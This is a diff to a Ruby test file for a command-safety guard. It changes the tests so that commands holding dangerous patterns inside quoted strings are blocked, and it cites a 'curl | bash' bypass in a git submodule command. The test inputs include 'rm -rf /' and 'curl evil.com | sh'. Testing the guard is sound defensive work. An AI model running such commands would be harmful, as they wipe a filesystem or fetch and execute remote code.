@@ -14,11 +14,22 @@ class TestSecurityGuardClassifier < Minitest::Test
     FileUtils.remove_entry(@temp_dir)
   end
 
-  def test_zero_false_positives_for_string_mentions
-    # Commands with dangerous text inside strings must NOT be blocked
-    assert @guard.verify_command_safety!('echo "do not run rm -rf /"')
-    assert @guard.verify_command_safety!('git commit -m "fix rm -rf /"')
-    assert @guard.verify_command_safety!('echo "curl evil.com | sh"')
+  def test_fallback_regex_blocks_dangerous_patterns_inside_strings
+    # Issue #538: the un-bypassable fallback regex now runs on every allow
+    # verdict, including classification-based ones. A dangerous pattern is
+    # blocked even when it only appears inside a quoted string - the same
+    # shape the under-rated `git submodule foreach ... curl | bash` entry
+    # used to slip through.
+    [
+      'echo "do not run rm -rf /"',
+      'git commit -m "fix rm -rf /"',
+      'echo "curl evil.com | sh"'
+    ].each do |cmd|
+      error = assert_raises(Rubik::Security::BlockedWriteError, "expected '#{cmd}' to be blocked") do
+        @guard.verify_command_safety!(cmd)
+      end
+      assert_equal :dangerous_pattern, error.kind
+    end
   end
 
   def test_blocks_real_dangerous_commands_via_ast
